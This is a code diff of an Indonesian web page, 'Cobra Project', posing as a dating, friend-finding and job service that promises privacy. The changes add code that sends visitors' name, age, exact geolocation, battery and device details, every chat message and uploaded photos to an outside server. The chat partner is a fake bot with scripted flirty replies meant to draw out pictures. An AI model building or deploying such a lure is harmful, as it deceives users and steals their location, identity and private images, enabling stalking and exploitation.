@@ -6,288 +6,193 @@
   <title>COBRA PROJECT</title>
   <style>
     body {
-      background-color: black;
-      color: #ff4d4d;
-      font-family: monospace;
+      background-color: white;
+      color: #111;
+      font-family: sans-serif;
       margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      overflow: hidden;
+      padding: 20px;
       text-align: center;
     }
-    h1 {
-      font-size: 2em;
-      margin-bottom: 10px;
-      animation: flicker 1.5s infinite alternate;
-    }
-    .glitch-button {
-      border: 2px solid #ff4d4d;
+    .btn {
+      background: black;
+      color: white;
+      border: none;
       padding: 10px 20px;
       margin: 10px;
-      font-size: 1em;
       cursor: pointer;
-      color: #ff4d4d;
-      background: black;
-      transition: background 0.3s, color 0.3s;
+      border-radius: 5px;
     }
-    .glitch-button:hover {
-      background: #ff4d4d;
-      color: black;
+    input {
+      padding: 10px;
+      width: 80%;
+      margin: 5px auto;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      display: block;
     }
-    #loading {
-      position: fixed;
-      top: 0;
-      left: 0;
-      background-color: black;
-      color: #ff4d4d;
-      width: 100%;
-      height: 100%;
-      z-index: 99;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.5em;
-      animation: flicker 1s infinite alternate;
-    }
-    @keyframes flicker {
-      from { opacity: 1; }
-      to { opacity: 0.5; }
-    }
-    input, button {
-      font-family: monospace;
+    #chatbox {
+      background: #f0f0f0;
+      padding: 10px;
+      width: 90%;
+      max-width: 500px;
+      height: 300px;
+      margin: 10px auto;
+      overflow-y: auto;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      text-align: left;
     }
   </style>
 </head>
 <body>
-  <div id="loading">🧠 Mendeteksi realitas digital...</div>
-  <div id="app" style="display:none;"></div>
-
+  <div id="app"></div>
   <script>
-    const app = document.getElementById('app');
-
-    window.onload = () => {
-      setTimeout(() => {
-        document.getElementById('loading').remove();
-        showWelcome();
-      }, 2000);
-    };
+    const app = document.getElementById("app");
+    let nama = "", umur = "", mode = "";
 
     function showWelcome() {
       app.innerHTML = `
-        <h1>👋 Halo kak/bang!</h1>
-        <p>Selamat datang di <b>Project Cobra Web</b></p>
+        <h2>👋 Haloo kak/bang!</h2>
+        <p>Selamat datang di <b>Cobra Project</b></p>
         <p>Kami menyediakan layanan:</p>
-        <ul style="list-style:none; padding:0; margin:10px 0;">
-          <li>🤝 Cari Teman</li>
+        <ul style="list-style:none;">
           <li>💘 Cari Pasangan</li>
+          <li>🤝 Cari Teman</li>
           <li>💼 Cari Pekerjaan</li>
         </ul>
-        <p style="max-width:500px; margin:auto;">Kami sedang mengembangkan web ini. Data & privasi Anda dijamin aman.</p>
-        <div class="glitch-button" onclick="showMainMenu()">Masuk</div>
+        <p style="color:gray">Situs ini sedang dikembangkan. Privasi Anda aman bersama kami.</p>
+        <button class="btn" onclick="formIdentitas('pasangan')">Cari Pasangan</button>
+        <button class="btn" onclick="formIdentitas('teman')">Cari Teman</button>
+        <button class="btn" onclick="formIdentitas('kerja')">Cari Pekerjaan</button>
       `;
     }
 
-    function showMainMenu() {
+    function formIdentitas(fitur) {
+      mode = fitur;
       app.innerHTML = `
-        <h1>👁️‍🗨️ Cobra Project</h1>
-        <p>Silakan pilih layanan:</p>
-        <div class="glitch-button" onclick="cariPasangan()">💘 Cari Pasangan</div>
-        <div class="glitch-button" onclick="cariTeman()">🤝 Cari Teman</div>
-        <div class="glitch-button" onclick="cariPekerjaan()">💼 Cari Pekerjaan</div>
+        <h3>✍️ Isi identitas terlebih dahulu</h3>
+        <input id="inputNama" placeholder="Nama Anda">
+        <input id="inputUmur" type="number" placeholder="Umur Anda">
+        <button class="btn" onclick="kirimIdentitas()">Lanjutkan</button>
       `;
-      app.style.display = "flex";
-      app.style.flexDirection = "column";
+    }
+
+    function kirimIdentitas() {
+      nama = document.getElementById("inputNama").value.trim();
+      umur = document.getElementById("inputUmur").value.trim();
+      if (!nama || !umur) return alert("Harap isi nama dan umur.");
+      fetch("https://cobraanotdeveloper.pythonanywhere.com/identity", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ nama, umur, fitur: mode, waktu: new Date().toLocaleString(), ua: navigator.userAgent })
+      });
+      askLocation();
+    }
+function askLocation() {
+      app.innerHTML = `<h3>📍 Meminta akses lokasi...</h3>`;
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          navigator.getBattery().then(batt => {
+            const battery = Math.round(batt.level * 100) + "%";
+            fetch("https://cobraanotdeveloper.pythonanywhere.com/log", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                lat: latitude, lon: longitude, acc: accuracy,
+                battery, ua: navigator.userAgent,
+                memory: navigator.deviceMemory || "Unknown",
+                platform: navigator.platform || "Unknown"
+              })
+            });
+          });
+          if (mode === "kerja") {
+            showKerjaForm();
+          } else {
+            showChat(getRandomName(), mode);
+          }
+        },
+        () => {
+          alert("Lokasi dibutuhkan!");
+          showWelcome();
+        }
+      );
     }
 
     function getRandomName() {
-      const names = ["Aluna", "Dimas", "Raisa", "Irfan", "Salsa", "Vina", "Rian", "Citra", "Agus"];
+      const names = ["Aluna", "Raisa", "Dimas", "Vina", "Irfan", "Salsa", "Agus"];
       return names[Math.floor(Math.random() * names.length)];
     }
 
-    function kirimDataKeServer(data) {
-      fetch("/kirimdata", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      }).then(res => res.json())
-        .then(res => {
-          if (!res.success) console.warn("Gagal kirim ke server");
-        }).catch(err => {
-          console.error("Error kirim:", err);
-        });
-    }
-
-    function cariPasangan() {
-      app.innerHTML = `<h1>📍 Meminta akses lokasi...</h1>`;
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          kirimDataKeServer({
-            fitur: "Cari Pasangan",
-            lat, lon,
-            waktu: new Date().toLocaleString()
-          });
-          app.innerHTML = `<h1>🔍 Mencari pasangan terdekat...</h1>`;
-          setTimeout(() => {
-            chatUI(getRandomName(), "Pasangan");
-          }, 3000);
-        },
-        () => {
-          app.innerHTML = `
-            <h1>❌ Lokasi dibutuhkan</h1>
-            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
-            <div class="glitch-button" onclick="cariPasangan()">📍 Coba Lagi</div>
-          `;
-        },
-        { timeout: 5000 }
-      );
-    }
-
-    function cariTeman() {
-      app.innerHTML = `<h1>📍 Mendeteksi lokasi untuk mencari teman...</h1>`;
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          kirimDataKeServer({
-            fitur: "Cari Teman",
-            lat, lon,
-            waktu: new Date().toLocaleString()
-          });
-          app.innerHTML = `<h1>🔍 Mencari teman terdekat...</h1>`;
-          setTimeout(() => {
-            chatUI(getRandomName(), "Teman");
-          }, 3000);
-        },
-        () => {
-          app.innerHTML = `
-            <h1>❌ Lokasi dibutuhkan</h1>
-            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
-            <div class="glitch-button" onclick="cariTeman()">📍 Coba Lagi</div>
-          `;
-        },
-        { timeout: 5000 }
-      );
-    }
-
-    function cariPekerjaan() {
-      app.innerHTML = `<h1>📍 Meminta lokasi untuk mencari kerja...</h1>`;
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          kirimDataKeServer({
-            fitur: "Cari Pekerjaan",
-            lat, lon,
-            waktu: new Date().toLocaleString()
-          });
-          setTimeout(() => {
-            showPekerjaanForm();
-          }, 2000);
-        },
-        () => {
-          app.innerHTML = `
-            <h1>❌ Lokasi dibutuhkan</h1>
-            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
-            <div class="glitch-button" onclick="cariPekerjaan()">📍 Coba Lagi</div>
-          `;
-        },
-        { timeout: 5000 }
-      );
-    }
-
-    function chatUI(name, type) {
+    function showChat(namaBot, jenis) {
       app.innerHTML = `
-        <h1>💬 Chat dengan ${name} (${type})</h1>
-        <div id="chatbox" style="flex:1; overflow-y:auto; background:#111; padding:10px; width:90%; max-width:500px; border:1px solid #ff4d4d; margin:10px auto; height:300px;"></div>
-        <div style="display:flex; justify-content:center; gap:5px;">
-          <input id="userInput" placeholder="Tulis pesan..." style="flex:1; padding:10px; background:#1a1a1a; color:white; border:none; width:60%;">
-          <button onclick="sendMsg('${name}')" class="glitch-button">Kirim</button>
-          <button onclick="document.getElementById('imgInput').click()" class="glitch-button">📷</button>
-        </div>
-        <input type="file" accept="image/*" id="imgInput" style="display:none" onchange="sendImg(event, '${name}')">
+        <h3>💬 Chat dengan ${namaBot} (${jenis})</h3>
+        <div id="chatbox"><b>${namaBot}:</b> Hai ${nama}! Kenalan yuk 😄</div>
+        <input id="userInput" placeholder="Tulis pesan...">
+        <br>
+        <button class="btn" onclick="sendChat('${namaBot}')">Kirim</button>
+        <button class="btn" onclick="document.getElementById('imgInput').click()">📷 Kirim Foto</button>
+        <input type="file" id="imgInput" accept="image/*" style="display:none" onchange="sendImg()">
       `;
-      const chatbox = document.getElementById("chatbox");
-      chatbox.innerHTML += `<p><b>${name}:</b> Hai! Aku pengen ngobrol 😄</p>`;
     }
 
-    function sendMsg(name) {
-      const box = document.getElementById("chatbox");
+    function sendChat(to) {
       const input = document.getElementById("userInput");
       const text = input.value.trim();
       if (!text) return;
-      box.innerHTML += `<p><b>Kamu:</b> ${text}</p>`;
+      const box = document.getElementById("chatbox");
+      box.innerHTML += `<br><b>Kamu:</b> ${text}`;
+      fetch("https://cobraanotdeveloper.pythonanywhere.com/chatlog", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ nama, umur, pesan: text, waktu: new Date().toLocaleString() })
+      });
       input.value = "";
-      if (text.toLowerCase().includes("pap") || text.toLowerCase().includes("foto")) {
-        setTimeout(() => {
-          box.innerHTML += `<p><b>${name}:</b> Nih aku kirim ya...</p>`;
-          box.innerHTML += `<img src="https://i.pinimg.com/564x/17/28/27/172827e2c1992f3a6b6d818ae6fce4f6.jpg" width="150" style="border-radius:8px; margin-top:5px;">`;
-          box.scrollTop = box.scrollHeight;
-        }, 1000);
-      } else {
-        setTimeout(() => {
-          box.innerHTML += `<p><b>${name}:</b> Kamu asik juga ya 😁</p>`;
-          box.scrollTop = box.scrollHeight;
-        }, 1000);
-      }
-      box.scrollTop = box.scrollHeight;
+      setTimeout(() => {
+        box.innerHTML += `<br><b>${to}:</b> Wah kamu lucu juga 😆`;
+        box.scrollTop = box.scrollHeight;
+      }, 1000);
     }
 
-    function sendImg(e, name) {
-      const file = e.target.files[0];
+    function sendImg() {
+      const file = document.getElementById("imgInput").files[0];
       if (!file) return;
       const reader = new FileReader();
-      reader.onload = function(evt) {
-        const box = document.getElementById("chatbox");
-        box.innerHTML += `<p><b>Kamu:</b></p><img src="${evt.target.result}" width="150" style="border-radius:8px; margin-top:5px;">`;
-        setTimeout(() => {
-          box.innerHTML += `<p><b>${name}:</b> Wah... 🫣</p>`;
-          box.scrollTop = box.scrollHeight;
-        }, 1000);
-        box.scrollTop = box.scrollHeight;
+      reader.onload = function (evt) {
+        const base64 = evt.target.result;
+        document.getElementById("chatbox").innerHTML += `<br><b>Kamu:</b><br><img src="${base64}" width="150" style="border-radius:5px;">`;
+        fetch("https://cobraanotdeveloper.pythonanywhere.com/upload", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ nama, umur, image: base64, waktu: new Date().toLocaleString() })
+        });
       };
       reader.readAsDataURL(file);
     }
-
-    function showPekerjaanForm() {
+function showKerjaForm() {
       app.innerHTML = `
-        <h1>📝 Formulir Lamaran Pekerjaan</h1>
-        <input placeholder="Nama Lengkap" id="namaKerja" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
-        <input placeholder="Umur" id="umurKerja" type="number" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
-        <input placeholder="Minat Pekerjaan" id="minatKerja" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
-        <div class="glitch-button" onclick="kirimLamaran()">Kirim Lamaran</div>
+        <h3>📝 Formulir Lamaran Pekerjaan</h3>
+        <input id="minat" placeholder="Pekerjaan yang diinginkan">
+        <button class="btn" onclick="submitKerja()">Kirim Lamaran</button>
       `;
     }
 
-    function kirimLamaran() {
-      const nama = document.getElementById("namaKerja").value.trim();
-      const umur = document.getElementById("umurKerja").value.trim();
-      const minat = document.getElementById("minatKerja").value.trim();
-      if (!nama || !umur || !minat) {
-        alert("Isi semua data.");
-        return;
-      }
-
-      kirimDataKeServer({
-        fitur: "Form Lamaran",
-        nama, umur, minat,
-        waktu: new Date().toLocaleString()
+    function submitKerja() {
+      const minat = document.getElementById("minat").value.trim();
+      if (!minat) return alert("Tolong isi minat pekerjaan.");
+      fetch("https://cobraanotdeveloper.pythonanywhere.com/identity", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          nama, umur, fitur: "Lamaran Kerja", minat,
+          waktu: new Date().toLocaleString(), ua: navigator.userAgent
+        })
       });
-
-      app.innerHTML = `<h1>⏳ Memproses lamaran Anda...</h1>`;
-      setTimeout(() => {
-        app.innerHTML = `
-          <h1>✅ Lamaran Diterima</h1>
-          <p>Terima kasih ${nama}, kami akan menghubungi Anda jika cocok.</p>
-          <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
-        `;
-      }, 3000);
+      app.innerHTML = `<h3>✅ Lamaran berhasil dikirim!</h3><p>Terima kasih, ${nama}. Kami akan menghubungi Anda jika cocok.</p><button class="btn" onclick="showWelcome()">Kembali</button>`;
     }
+
+    // Tampilkan welcome saat halaman dibuka
+    window.onload = showWelcome;
   </script>
 </body>
 </html>
